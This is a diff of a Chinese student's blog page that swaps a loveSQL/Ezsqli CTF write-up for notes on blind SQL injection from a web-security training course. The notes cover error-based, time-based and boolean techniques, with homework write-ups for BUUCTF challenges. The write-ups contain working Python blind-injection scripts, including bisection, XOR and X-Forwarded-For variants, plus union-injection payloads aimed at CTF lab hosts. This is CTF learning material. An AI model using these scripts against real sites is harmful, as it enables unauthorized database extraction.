@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="loveSQL和[GYCTF2020]Ezsqli wp, 黛色若梦">
+    <meta name="keywords" content="python盲注脚本, 黛色若梦">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>loveSQL和[GYCTF2020]Ezsqli wp | 黛色若梦</title>
+    <title>python盲注脚本 | 黛色若梦</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">loveSQL和[GYCTF2020]Ezsqli wp</h1>
+                    <h1 class="description center-align post-title">python盲注脚本</h1>
                 </div>
             </div>
         </div>
@@ -432,8 +432,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/sqli%E9%9D%B6%E5%9C%BA/">
-                                <span class="chip bg-color">sqli靶场</span>
+                            <a href="/tags/web%E9%A2%98%E7%9B%AE/">
+                                <span class="chip bg-color">web题目</span>
                             </a>
                         
                     </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-11-15
+                    2021-11-20
                 </div>
                 
 
@@ -469,54 +469,98 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="1-loveSQL"><a href="#1-loveSQL" class="headerlink" title="1.loveSQL"></a>1.loveSQL</h1><h4 id="（1）联合查询注入"><a href="#（1）联合查询注入" class="headerlink" title="（1）联合查询注入"></a>（1）联合查询注入</h4><p>（1）整体思路</p>
-<p>利用 information_schema</p>
-<pre><code>简单来说，这个库在mysql中就是个信息数据库，它保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。
-</code></pre>
-<p> 在注入中，infromation_schema库的作用无非就是可以获取到table_schema、table_name、column_name这些数据库内的信息。<br>————————————————<br>版权声明：本文为CSDN博主「WHOAMIAnony」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106647880">https://blog.csdn.net/qq_45521281/article/details/106647880</a></p>
-<h5 id="观察题目提示"><a href="#观察题目提示" class="headerlink" title="观察题目提示"></a>观察题目提示</h5><p>是SQL注入</p>
-<h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>username或是password，分别试试字符型或整型之类的注入类型。</p>
-<p>试着加一个单引号，发现</p>
-<p><img src="/images/%E5%9C%A8username%E4%B8%8A%E6%B3%A8%E5%85%A5-16370658334761.png" alt="在username上注入"></p>
-<p><img src="/images/%E5%9C%A8password%E9%87%8C%E6%B3%A8%E5%85%A5-16370658441832.png" alt="在password里注入"></p>
-<p>可以发现注入点如果在password，password已经完整了，会有多余的单引号。而username的123前面只有一个单引号，可后面却有两个单引号</p>
-<p>说明我们令username=12345’ 的时候让整个sql句子里多出了一个单引号，使得句子发生报错了</p>
-<p>因此这是一道关于sql单引号闭合的题目。</p>
-<p>然后就想注释掉后面的语句，用万能钥匙usename=1’ or 1=1#</p>
-<p><img src="/images/%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99%E7%BB%95%E8%BF%87.png" alt="万能钥匙绕过"></p>
-<p><img src="/images/%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99%E7%BB%95%E8%BF%872.png" alt="万能钥匙绕过2"></p>
-<p>可以登录，但是还是没有flag,然后就还是按照一般步骤继续做。</p>
-<h5 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h5><p><strong>注意：此时是在url中输入的，所以不能用#，而用其url编码%23</strong>，与刚刚的那个万能钥匙不同。</p>
-<p>构造联合查询语句</p>
-<h5 id="测试显示位"><a href="#测试显示位" class="headerlink" title="测试显示位"></a>测试显示位</h5><p><img src="/images/%E6%9F%A5%E8%AF%A2%E5%88%97%E6%95%B0.png" alt="查询列数"></p>
-<h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>查询当前数据库名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),3%23&amp;password=1</span></span><br></pre></td></tr></table></figure>
+                <p>0x00</p>
+<p>（1）盲注</p>
+<p>web方向的培训讲到sql的盲注部分。盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。sql注入绝大多数都是盲注了，是一个蛮重要的知识点，分为布尔盲注，时间（延时）盲注，报错盲注三大类。第一在于逻辑的判断，往往有两种回显页面显示对错，借助布尔型来一一剖解注入；第二则是通过时间函数sleep实现是否延时跳转来判断注入；第三是通过报错函数注入显示数据库等名字，比较善良的一种注入方式。</p>
+<p>（2）python脚本的编写：讲了字典法，而接下来的作业题目还要用到二分法。</p>
+<p>0x01</p>
+<p>补充一下有关mysql的函数：</p>
+<h5 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h5><p>数据库BUG报错注入和数据库函数报错注入</p>
+<p>利用数据库BUG报错注入需要的函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">只要是count()，rand() ，group by 三个函数连用就会造成这种报错</span><br><span class="line">left(rand(),3)     :不一定报错</span><br><span class="line">floor(rand(0)*2)    :一定报错</span><br><span class="line">round(x,d)       :x指要处理的数，d是指保留几位小数</span><br><span class="line">concat()         :字符串拼接</span><br></pre></td></tr></table></figure>
 
-<h5 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="/images/%E5%9B%9E%E6%98%BE%E4%BD%8D.png" alt="回显位"></h5><p><img src="/images/%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="当前数据库"></p>
-<h5 id="查询表"><a href="#查询表" class="headerlink" title="查询表"></a>查询表</h5><p>/check.php?username=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&amp;password=1</p>
-<p><img src="/images/%E6%9F%A5%E8%AF%A2%E8%A1%A8.png" alt="查询表"></p>
-<p>就是这里我犯了很蠢的错，select 1,2,3 from 数据库+限制条件，语法。。。</p>
-<h5 id="查询（列名）字段（题目是lovesql-两个表中有一个长得很像，所以选择那个像的）"><a href="#查询（列名）字段（题目是lovesql-两个表中有一个长得很像，所以选择那个像的）" class="headerlink" title="查询（列名）字段（题目是lovesql,两个表中有一个长得很像，所以选择那个像的）"></a>查询（列名）字段（题目是lovesql,两个表中有一个长得很像，所以选择那个像的）</h5><p>/check.php?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’%23&amp;password=1</p>
-<h5 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="/images/%E6%9F%A5%E8%AF%A2%E5%88%97.png" alt="查询列"></h5><h5 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h5><p><img src="/images/%E6%9F%A5%E8%AF%A2%E5%86%85%E5%AE%B9.png" alt="查询内容"></p>
-<p><img src="/images/f12%E8%B0%83%E5%87%BA.png" alt="f12调出"></p>
-<p><img src="/images/%E6%8B%BF%E5%88%B0flag.png" alt="拿到flag"></p>
-<h5 id="（2）无列名注入"><a href="#（2）无列名注入" class="headerlink" title="（2）无列名注入"></a>（2）无列名注入</h5><p>【mysql】在被waf禁掉了information_schema库后还能有哪些利用思路,类似的表还有：<a target="_blank" rel="noopener" href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">mysql.innodb_table_stats</a>、mysql.innodb_table_index都存放有库名表名。</p>
-<p>整体思路：</p>
-<p>先判断注入点，注入类型，再看列数，然后无列名就不能用informtion_schema这个库了，换成mysql.innodb_table_starts,可以查出数据库与表名，查不出字段。</p>
-<p>查询库</p>
-<p>先用常规联合查询 username=1’ union slect 1,database(),3%23</p>
-<p>查询表</p>
-<p>mysql.innodb_table_stats</p>
-<p>-1’union select 1，(select group_concat(table_name) from mysql.innodb_table_stats),3–+</p>
-<p><img src="/images/%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="查询数据库"></p>
-<p>查询字段名</p>
-<p>username=1’ union select 1,(select 1 union select from 10ve1ysq1),3#，测试表中有几列数据</p>
-<p><img src="/images/%E6%B5%8B%E8%AF%95%E8%A1%A8%E9%87%8C%E7%9A%84%E5%88%97%E6%95%B0-16371266386221.png" alt="测试表里的列数">直到测到username=1’ union select 1,(select 1,2,3 union select* from l0ve1ysq1),3%23&amp;password=1234，一共有三列。</p>
-<p><img src="/images/%E4%B8%89%E5%88%97-16371266609782.png" alt="三列"></p>
-<p>查询数据</p>
-<p>字段的名字不清楚，所以用别名代替。</p>
-<p><img src="/images/%E6%88%90%E5%8A%9F%E4%BA%86.png" alt="成功了"></p>
-<p><img src="/images/%E6%9F%A5%E7%9C%8B%E5%8D%B3%E5%8F%AF.png" alt="查看即可"></p>
+<p>利用函数报错注入需要的函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Updatexml()</span><br><span class="line">Exp()</span><br><span class="line">Geometrycollection()</span><br><span class="line">Polygon()</span><br><span class="line">Multipoint()</span><br><span class="line">Multilinestring()</span><br><span class="line">Multipolygon()</span><br></pre></td></tr></table></figure>
+
+<p>具体讲一下extractvalue、updatexml函数。</p>
+<h6 id="一、extractvalue函数"><a href="#一、extractvalue函数" class="headerlink" title="一、extractvalue函数"></a>一、extractvalue函数</h6><p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html?spm=a2c6h.12873639.0.0.1f1b78ceAJvelg#function_extractvalue"><code>ExtractValue(xml_frag, xpath_expr)</code></a></p>
+<p>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p>
+<p>例如：<code>SELECT ExtractValue(&#39;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#39;, &#39;/a/b&#39;);</code> 就是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。这里就是利用这个特性来获得我们想要知道的内容。</p>
+<p><img src="/images/shuiyin.png" alt="1551928141656"></p>
+<h6 id="二、updatexml函数"><a href="#二、updatexml函数" class="headerlink" title="二、updatexml函数"></a>二、updatexml函数</h6><p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html#function_updatexml"><code>UpdateXML(xml_target, xpath_expr, new_xml)</code></a></p>
+<p><strong>xml_target:：</strong> 需要操作的xml片段</p>
+<p><strong>xpath_expr：</strong> 需要更新的xml路径(Xpath格式)</p>
+<p><strong>new_xml：</strong> 更新后的内容</p>
+<p><img src="/images/shuiyin.png" alt="1551929714141"></p>
+<p>当Xpath路径语法错误时，就会报错，报错内容含有错误的路径内容：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html">xpath</a></p>
+<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p><strong>Sleep</strong>()                           :延迟函数</p>
+<p> <strong>If</strong>(condition,true,false)          :条件语句 </p>
+<p><strong>mid</strong>(str,start,length)             :字符串截取</p>
+<p> <strong>ORD</strong>()                             :转换成ascii码</p>
+<p> <strong>Length</strong>()                          :统计长度 </p>
+<p><strong>version</strong>()                         :查看数据库版本</p>
+<p><strong>database</strong>()                        :查看当前数据库名</p>
+<p> <strong>user</strong>()                            :查看当前用户</p>
+<p>database()：当前连接数据库<br>version() ：@@version 版本<br>user()：连接用户<br>Length()： 返回字符串的长度<br>ascii()：返回字符ASCII码<br>if(条件，exp1，exp2)：条件为真执行exp1，否则执行exp2<br>substr()：字符串截断函数<br>substring()字符串截断函数<br>mid()：字符串截断函数<br>left(str, len)从左开始截取str中len长度的字符)<br>right(str, len)，从右开始截取str中len长度的字符串</p>
+<h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p><strong>mid</strong>(str,start,length)  :字符串截取</p>
+<p> <strong>ORD</strong>()                  :转换成ascii码 </p>
+<p><strong>Length</strong>()               :统计长度 </p>
+<p><strong>version</strong>()              :查看数据库版本 </p>
+<p><strong>database</strong>()             :查看当前数据库名</p>
+<p> <strong>user</strong>()                 :查看当前用户</p>
+<h5 id="python脚本函数使用"><a href="#python脚本函数使用" class="headerlink" title="python脚本函数使用"></a>python脚本函数使用</h5><p>废话少说，上课上的bool和time的脚本</p>
+<p>time注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">def timeOut(url):</span><br><span class="line">   #判断是否延时</span><br><span class="line">    try:</span><br><span class="line">        res=requests.get(url,timeout=3)</span><br><span class="line">        return &quot;No&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return &quot;TimeOut&quot;</span><br><span class="line">        </span><br><span class="line">def get_dbName(url):</span><br><span class="line">   #获取数据库名称</span><br><span class="line">    len=0</span><br><span class="line">    while True:</span><br><span class="line">        dbNameLen_url=url+&quot;?id=1&#x27; and if(length(database())=&quot;+str(len)+&quot;,sleep(5),1)--+&quot;</span><br><span class="line">        #print(dbNameLen_url)</span><br><span class="line">        if &quot;TimeOut&quot; in timeOut(dbNameLen_url):</span><br><span class="line">            print(&quot;The Length of dbname :&quot;+str(len))</span><br><span class="line">            break</span><br><span class="line">        elif len&gt;=30:</span><br><span class="line">            print(&quot;ERROR!!!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            len+=1</span><br><span class="line">            </span><br><span class="line">    dbName=&quot;&quot;</span><br><span class="line">    for i in range(1,int(len)+1):</span><br><span class="line">        for a in string.ascii_lowercase:</span><br><span class="line">            dbName_url=url+&quot;?id=1&#x27; and if(substr(database(),&quot;+str(i)+&quot;,1)=&#x27;&quot;+a+&quot;&#x27;,sleep(5),1)--+&quot;</span><br><span class="line">            print()</span><br></pre></td></tr></table></figure>
+
+<p>bool注入 </p>
+<h5 id="同时用到了字典法"><a href="#同时用到了字典法" class="headerlink" title="同时用到了字典法"></a>同时用到了字典法</h5><p>import requests</p>
+<p>dic=”abcdefghijklmnopqrstuvwxyz0123456789_”<br>flag=””</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#sql数据库不区分大小写，都会打印出来，但flag就一般是小写</span><br></pre></td></tr></table></figure>
+
+<p>#payload: and substr(database(),1,1)=’s’</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#爆库payload: and substr(database(),1,1)=&#x27;s&#x27; 注释</span><br><span class="line">#爆表 payload:and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">#limit 0,1是因为有不止一个表，先限制查一个表</span><br><span class="line">#爆字段 substr((select group_concat(username,password) from users limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>for i in range(1,8):<br>    for char in dic:<br>        url=”<a target="_blank" rel="noopener" href="http://e38e687d-e37b-4cc8-8fa2-5fa80ff2b5c7.node4.buuoj.cn/Less-8/?id=1&#39;&quot;">http://e38e687d-e37b-4cc8-8fa2-5fa80ff2b5c7.node4.buuoj.cn/Less-8/?id=1&#39;&quot;</a><br>        payload=” and substr(database(),{},1)=’{}’–+”.format(i,char)<br>        url = url + payload<br>        print(url)<br>        r=requests.get(url)<br>        #print(r.text)<br>        if “are” in r.text:</p>
+<p>#查看网页源代码里特殊的，要区分大小写，ctrl+f打开网页源代码搜索两种的异处。<br>            flag+=char<br>            print(flag)<br>print(flag)</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/2247.html">python</a> </p>
+<p>每一行都是一个语句，当语句以冒号<code>:</code>结尾时，缩进的语句视为代码块。</p>
+<p>缩进有利有弊。好处是强迫你写出格式化的代码，但没有规定缩进是几个空格还是Tab。按照约定俗成的惯例，应该始终坚持使用<em>4个空格</em>的缩进。然后代码块要能运行，缩进就必须匹配！</p>
+<p>注意，Python程序是大小写敏感的，如果写错了大小写，程序会报错。</p>
+<p>在Python中，定义一个函数要使用<code>def</code>语句，依次写出函数名、括号、括号中的参数和冒号<code>:</code>，然后，在缩进块中编写函数体，函数的返回值用<code>return</code>语句返回。</p>
+<h5 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h5><p>字典的每个键值 <strong>key=&gt;value</strong> 对用冒号 <strong>:</strong> 分割，每个键值对之间用逗号 <strong>,</strong> 分割，整个字典包括在花括号 <strong>{}</strong> 中 ,格式如下所示：</p>
+<p>d = {key1 : value1, key2 : value2 }</p>
+<h5 id="requests库"><a href="#requests库" class="headerlink" title="requests库"></a>requests库</h5><p>生成一个网络请求<br>使用Requests之前，先导入该模块 import requests<br>先来一个最简单的例子，像服务器发送一个GET请求   r = requests.get(‘<a target="_blank" rel="noopener" href="http://www.baidui.com&/#39;">http://www.baidui.com&#39;</a>)<br>现在你拥有了一个名叫r的Respone对象，通过这对象，你可以获取网络应答的所有信息，例如通过r的text属性就能获取到网页内容。</p>
+<p>Request一个优秀的特性是能够让你显示的知道你在发送什么样的请求，上边我们在发送一个GET请求，我们可以像下边的例子一样很清楚的发送POST，EDLETE， PUT等请求</p>
+<p>r = requests.post(“<a target="_blank" rel="noopener" href="http://example.com&quot;/">http://example.com&quot;</a>, data={“key”: “value”})<br>r = requests.put(“<a target="_blank" rel="noopener" href="http://example.com&quot;/">http://example.com&quot;</a>)</p>
+<h5 id="format"><a href="#format" class="headerlink" title="format"></a>format</h5><p>格式化函数，通过<code>&#123;&#125;</code>和<code>:</code>来构建语句，用format函数中的内容替代前面{}中的内容。在padload里” “.format( , , )   format()可以接受不限个参数，位置可不按顺序。{}里放入数字指其顺序。同时也可是” “%( , , )</p>
+<hr>
+<p>0x03</p>
+<p>作业wp</p>
+<h5 id="极客大挑战-2019-FinalSQL-二分法"><a href="#极客大挑战-2019-FinalSQL-二分法" class="headerlink" title="[极客大挑战 2019]FinalSQL  二分法"></a>[极客大挑战 2019]FinalSQL  二分法</h5><p>这个已经有wp脚本了。首先感觉题目在提示我们flag在上面的ID里面，但是下面的usename感觉可以进行万能钥匙试一下虽然绝对不可能→_→，然后再通过bp fuzz一下,看看过滤掉了什么。发现常用的一些字符都被过滤了，在usename里没有回显正确的。然后回来在ID里面，有回现正确和错误的情况，’^’没有被过滤，用异或的布尔型注入，然后用一些其他字符来代替常用的空格等。用（）把字段包起来来代替空格。</p>
+<p><img src="/images/%E8%BF%87%E6%BB%A4.png" alt="过滤"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#二分法</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://e01966eb-4b7c-4a17-9167-ad0c847fc032.node4.buuoj.cn:81/search.php?&quot;</span><br><span class="line">params = &#123;&quot;id&quot;: &quot;&quot;&#125;#字符类型，存储任意类型的对象</span><br><span class="line">flag= &quot;&quot;</span><br><span class="line">for i in range(1, 1000):</span><br><span class="line">   # time.sleep(0.06)</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high)&gt;&gt;1#右移一位，相当于除以2，如果作为带符号的32位整数，它是溢出的并##且翻转为负。因此(high + low)// 2是错误的，因为high + low的运算结果可能超出当前类型所表#示的范围的。但是这题有点夸张，还是可以的吧。</span><br><span class="line">    while (low &lt; high):</span><br><span class="line">        # 库名</span><br><span class="line">        #params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (i, mid)</span><br><span class="line">  # 相当于&quot;1^ (ascii(substr((select group_concat(schema_name) from information_schema.schemata) ,%d,1))&gt;%d)^1&quot;     </span><br><span class="line">       </span><br><span class="line">       # 表名</span><br><span class="line">        # params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        # 字段名</span><br><span class="line">        #params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">        # 内容</span><br><span class="line">        params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid)</span><br><span class="line">       #两个1-&gt;为0，当值为1时即可</span><br><span class="line">       r = requests.get(url, params=params)</span><br><span class="line">        time.sleep(0.04)</span><br><span class="line">        #print(r.text)</span><br><span class="line">        if &quot;Cl&quot; in r.text:</span><br><span class="line">            low = mid + 1#一步步逼近该值，二分法提高效率了</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) &gt;&gt;1</span><br><span class="line">    if (mid == 32 or mid == 127):</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)#强制转化为字符型</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>不得不说这个字段查出来的内容好狗，100位都放不下</p>
+<h5 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h5><p>hehe,和proxy的关系，让我们用bp？不懂有什么关系。注入点的位置的确蛮深的，要好好学注入位置的寻找。但找到后步骤就与以往大同小异。也是布尔盲注。</p>
+<p>一开始是用get方式输入查询URL，然后view-source可发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Debug Info: </span><br><span class="line"> Duration: 0.27719688415527 s </span><br><span class="line"> Current Ip: 220.200.12.172  --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>current ip，last ip让我们想到了xff的伪造，先输入 1’ or ‘1 此时我们的current IP就等于它，让后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or ‘1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为一。</p>
+<p><img src="/images/.png" alt="png"></p>
+<p>然后还有一个点就是题目中‘’同时 flag{} 里为 uuid‘’，所以要把cookie中 的uuid代入。然后自己写一个脚本试试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#这个缩进对齐管得超级严。。。</span><br><span class="line">#headers要用post,因为post输入内容。在cookie注入和xff伪造里会用到</span><br><span class="line">#一开始不太清楚为什么要加两次的or，应该因为要闭合，原理同1&#x27;or&#x27;1。</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url=&quot;http://node4.buuoj.cn:28711/&quot;</span><br><span class="line">head=&#123;</span><br><span class="line">    &quot;Cookie&quot;: &quot;track_uuid=c1e2083a-861f-4f74-d6f2-2fb3baa02498&quot;,</span><br><span class="line">    &quot;X-Forwarded-For&quot; : &quot;&quot;&#125;#headers要用post,因为post输入内容。在cookie注入和xff伪造里会用到</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low+high)&gt;&gt;1</span><br><span class="line">    while low&lt;high:</span><br><span class="line">       # head[&quot;X-Forwarded-For&quot;]=&quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i,mid)</span><br><span class="line">       # head[&quot;X-Forwarded-For&quot;]=&quot;0&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125; or &#x27;0&quot;.format(i,mid)</span><br><span class="line">       # head[&quot;X-Forwarded-For&quot;] = &quot;0&#x27; or ascii(substr((select group_concat(column_name)from information_schema.columns where table_name= &#x27;F4l9_t4b1e&#x27; ), &#123;0&#125;, 1)) &gt; &#123;1&#125; or &#x27;0&quot;.format(i, mid)</span><br><span class="line">        head[&quot;X-Forwarded-For&quot;] = &quot;0&#x27; or ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e ), &#123;0&#125;, 1)) &gt; &#123;1&#125; or &#x27;0&quot;.format(i, mid)</span><br><span class="line">        r=requests.post(url=url,headers=head)</span><br><span class="line">        time.sleep(0.01)</span><br><span class="line">        head[&quot;X-Forwarded-For&quot;]=&quot;111&quot;</span><br><span class="line">        r=requests.post(url=url,headers=head)</span><br><span class="line">        head[&quot;X-Forwarded-For&quot;]=&quot;111&quot;</span><br><span class="line">        r=requests.post(url=url,headers=head)</span><br><span class="line">        if &quot;Last Ip: 1&quot; in r.text:</span><br><span class="line">             low = mid+1</span><br><span class="line">        else:</span><br><span class="line">             high = mid</span><br><span class="line">        mid=(low+high)&gt;&gt;1</span><br><span class="line">    if(mid==32 or mid==127):</span><br><span class="line">        break</span><br><span class="line">    flag+=chr(mid)</span><br><span class="line">    print (flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>然后我们就可以拿到flag了   flag{G1zj1n_W4nt5_4_91r1_Fr1end},flag{08473300-2a95-40aa-91ac-fb4169e55c6c}试了后面一个。</p>
+<p>[GYCTF2020]Ezsqli</p>
+<p>这题上周没做，无语，这周用脚本跑一下。输入1，出现bool(false)，然后就应该用逻辑词与（1&amp;&amp;1=1，1&amp;&amp;1=2）或异或判断，finalsql用了异或，这里用”与“来测一下回显正确与错误所显现的页面。又通过fuzz试了一下，发现information_schema库被过滤了，用无列名注入，加上布尔盲注的方法。</p>
+<p>用sys.schema_table_statistics爆表名，之后是无列名</p>
